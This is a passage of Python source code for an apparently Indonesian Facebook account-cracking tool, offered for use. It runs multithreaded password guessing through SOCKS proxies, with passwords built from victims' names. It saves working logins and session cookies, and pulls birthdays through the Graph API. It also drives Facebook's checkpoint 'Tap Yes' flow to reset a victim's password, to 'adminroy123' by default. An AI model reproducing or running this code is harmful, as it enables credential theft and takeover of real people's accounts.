            coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
            open('results/OKE.txt', 'a').write(f"[✓] {user} • {pasw}\n")
            jalan(f"\r {N}[{H}✓{N}] {H}Account unlocked{N}");time.sleep(0.03)
            cek_apk(session,coki)
    elif "checkpoint" in session.cookies.get_dict():
        title=re.findall("\<title>(.*?)<\/title>",str(response))
        link2=response.find("form",{"method":"post"})
        listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
        for x in response("input"):
            if x.get("name") in listInput:
                data2.update({x.get("name"):x.get("value")})
        an=session.post(url_mb+link2.get("action"),data=data2)
        response2=BeautifulSoup(an.text,"html.parser")
        number=0
        cek=[cek.text for cek in response2.find_all("option")]
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                if "y" in ubahP:
                    mmk = pwBaru
                    jalan(f"\r [{H}•{N}] Status : {BM}{P}TAP YES{N}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
                else:
                    mmk = "adminroy123"
                    jalan(f"\r [{H}•{N}] Status : {BM}{P}TAP YES{N}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
            elif "Masukan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
                print(' [%s!%s] Sorry, the account is installed A2F'%(M,N))
            else:

                open('results/ERROR.txt', 'a').write(f"[ROY-CP] {user} • {pasw}\n")
                print(f" {N}[{M}!{N}] Error")
        else:

            open(f'results/CP-DETEKTOR-{ha}-{op}-{ta}.txt', 'a').write(f"[ROY-CP] {user} • {pasw}\n")
            print(" %s[%s•%s] There are %s options "%(N,H,N,len(cek)))
        for opt in range(len(cek)):
            print(f" [\x1b[1;92m{str(opt+1)}\x1b[0m] "+cek[opt])
    else:

        print(f"\r {N}[{M}!{N}] Password is wrong or has been changed")
        open('results/INVALID-OK.txt', 'a').write(f"[ROY-CP] {user} • {pasw}\n")

#UBAH PW

def ubah_pw(session,response,link2,user,mmk):
    dat,dat2={},{}
    but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
    for x in response("input"):
        if x.get("name") in but:
            dat.update({x.get("name"):x.get("value")})
    ubahPw=session.post(url_mb+link2.get("action"),data=dat).text
    resUbah=BeautifulSoup(ubahPw,"html.parser")
    link3=resUbah.find("form",{"method":"post"})
    but2=["submit[Next]","nh","fb_dtsg","jazoest"]
    if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
        for b in resUbah("input"):
            if b.get("name") in but2:
                dat2.update({b.get("name"):b.get("value")})
        dat2.update({"password_new":"".join(mmk)})
        an=session.post(url_mb+link3.get("action"),data=dat2)
        coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
        print(f"\r {N}[{H}TAP-YES{N}] {H}{user} • {''.join(mmk)}{N}")
        print(f"\r {A}Cookie : {coki}{N}")
        open('results/TAB-YES.txt', 'a').write(f"[TAP-YES] {user} • {''.join(mmk)}\n")
        cek_apk(session,coki)

# CEK APLIKASI YANG TERKAIT

def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
    else:

        print(f'\r 🎮  %sYour Active Application Details :'%(H))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N))
    else:

        print(f'\r 🎮  %sYour Expired Application Details :'%(M))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(f'\r')

# MULAI CRACK

class __crack__:

    def __init__(self):

        self.id = []

    # ------- NAMPILKAN APLIKASI --------


# METODE SANDI MANUAL



    def plerr(self,id):
        self.id = id
        print(f'\n %s[%s•%s] Total ID : %s%s%s' %(N,H,N,H,len(self.id),N))
        ___yayanganteng___ = input('%s\n [%s?%s] Silakan Tekan (%sENTER%s) : %s'%(N,K,N,H,N,H))
        if ___yayanganteng___ in ('Kontol'):
            self.__pler__()

            #print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.plerr(id)
# PROSES CRACK METODE 3 in 1



    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;91m[?]","\x1b[1;92m[?]","\x1b[1;93m[?]","\x1b[1;94m[?]","\x1b[1;95m[?]","\x1b[1;96m[?]","\x1b[1;97m[?]"])
        sys.stdout.write(f"\r {N}{animasi} {N}{loop}{N}/{M}{len(self.id)} {N}[{H}OK:{len(ok)}{N}][{K}CP:{len(cp)}{N}] [{H}{'{:.1%}'.format(loop/float(len(self.id)))}{N}]")
        sys.stdout.flush()
        try:os.mkdir('results')
        except:pass
        try:
            for pw in pasw:
                pw = pw.lower()
                session=requests.Session()
                nip=random.choice(prox)
                proxs= {'http': 'socks4://'+nip}
                ua = 'Mozilla/5.0 (Linux; U; Android 12; en-us; GT-C108T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.4802.140 Mobile Safari/537.36'
                ua2 = random.choice(ugen2)
                session.headers.update({'Host': cebok,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                p = session.get('https://'+cebok+'/login/device-based/password/?uid='+user+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
                dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":user,"next":"https://"+cebok+"/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
                koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
                koki+=' m_pixel_ratio=2.625; wd=412x756'
                heade={'Host': cebok,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://'+cebok,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://'+cebok+'/login/device-based/password/?uid='+user+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                po = session.post('https://'+cebok+'/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
                if "c_user" in session.cookies.get_dict():
                    cooz = session.cookies.get_dict()
                    coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
                    if "t" in Apk:
                        print('\r %sMETA LIVE OK %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
                        print(f'\r {H}Cookie   : {coki}\n')
                    elif "y" in Apk:
                        print(f'\r %sMETA LIVE OK %s           	    \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
                        print(f'\r {H}Cookie   : {coki}')
                    wrt = '[ROY-OK] %s • %s' % (user,pw)
                    ok.append(wrt)
                    open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r %sMETA LIVE CP %s               \n Username : %s\n Password : %s\n Tanggal Lahir : %s %s %s%s\n'%(K,waktu,user,pw,day,month,year,N))
                        wrt = '[ROY-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
                        open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    print('\r %sMETA LIVE CP %s               \n Username : %s\n Password : %s%s\n'%(K,waktu,user,pw,N))
                    wrt = '[ROY-CP] %s • %s' % (user,pw)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
                #time.sleep(31)
            loop+=1
        except requests.exceptions.ConnectionError:
            self.__metode__(cebok, user, pasw)




    def __pler__(self):

        yan = input('\n %s[%s?%s] Choose Method : '%(N,K,N))
        if yan == '':
            print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.__pler__()
        elif yan in ('1', '01'):
            xx = "free.facebook.com"
            self.kombinasi_pw(xx)
        elif yan in ('2', '02'):
            xx = "mbasic.facebook.com"
            self.kombinasi_pw(xx)
        elif yan in ('3', '03'):
            xx = "m.facebook.com"
            self.kombinasi_pw(xx)
        else:
            print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.__pler__()


    def kombinasi_pw(self,url):
        print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n %sPASSWORD MENU%s'%(N,BM,N))
        print(' %s[%s1%s] nama,nama123,nama12345'%(N,H,N))
        print(' %s[%s2%s] nama,nama123,nama1234,nama12345'%(N,H,N))
        print(' %s[%s3%s] nama,nama123,nama1234,nama12345,%s+Sandi%s'%(N,H,N,H,N))
        pw = input(f"\n {N}[{K}?{N}] Choose Password Method : ")
        if pw in[""]:
            print(f" {N}[{M}!{N}] Don't be empty");self.kombinasi_pw(url)
        elif pw in["1","01"]:
            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
            print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [%s!%s] Aktifkan Mode Pesawat 5 detik jika Terkena Spam \n [%s!%s] Aktifkan Kembali Mode Pesawat Pada DUMP ID Ke 1000\n [%s!%s] CTRL+Z %sPada Keyboard%s Jika Ingin Stop !\n▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄'%(N,M,N,M,N,M,N,H,N))
            with YayanGanteng(max_workers=35) as kirim:
                for yntkts in self.id:
                   try:
                       uid, name = yntkts.split('<=>')
                       xz = name.split(' ')
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345"]
                       else:
                           pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345"]
                       kirim.submit(self.__metode__,url,uid,pwx)
                   except:pass
            hasil(ok,cp)

        elif pw in["2","02"]:
            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
            print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [%s!%s] Aktifkan Mode Pesawat 5 detik jika Terkena Spam \n [%s!%s] Aktifkan Kembali Mode Pesawat Pada DUMP ID Ke 1000\n [%s!%s] CTRL+Z %sPada Keyboard%s Jika Ingin Stop !\n▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄'%(N,M,N,M,N,M,N,H,N))
            with YayanGanteng(max_workers=35) as kirim:
                for yntkts in self.id:
                   try:
                       uid, name = yntkts.split('<=>')
                       xz = name.split(' ')
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                       else:
                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                       kirim.submit(self.__metode__,url,uid,pwx)
                   except:pass
            hasil(ok,cp)

        elif pw in["3","03"]:
            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n %sSETTING PASSWORD MANUAL%s'%(N,BM,N))
            print(" %s[%s!%s] Berikan Tanda %sKomma Pada%s Setiap Kata"%(N,M,N,H,N))
            print(" %s[%s!%s] Example : %ssayang,rahasia,bismillah%s"%(N,M,N,H,N))
            pw = input(f" {N}[{K}?{N}] Enter additional password : {H}").split(",")
            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
            print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [%s!%s] Aktifkan Mode Pesawat 5 detik jika Terkena Spam \n [%s!%s] Aktifkan Kembali Mode Pesawat Pada DUMP ID Ke 1000\n [%s!%s] CTRL+Z %sPada Keyboard%s Jika Ingin Stop !\n▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄'%(N,M,N,M,N,M,N,H,N))
            with YayanGanteng(max_workers=35) as kirim:
                for yntkts in self.id:
                   try:
                       uid, name = yntkts.split('<=>')
                       xz = name.split(' ')
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           xxx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                           pwx = xxx + pw
                       else:
                           xxx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                           pwx = xxx + pw
                       kirim.submit(self.__metode__,url,uid,pwx)
                   except:pass
            hasil(ok,cp)
        else:
            print(f"\n {N}[{M}!{N}] Correct input");self.kombinasi_pw(url)


if __name__ == '__main__':

    login()
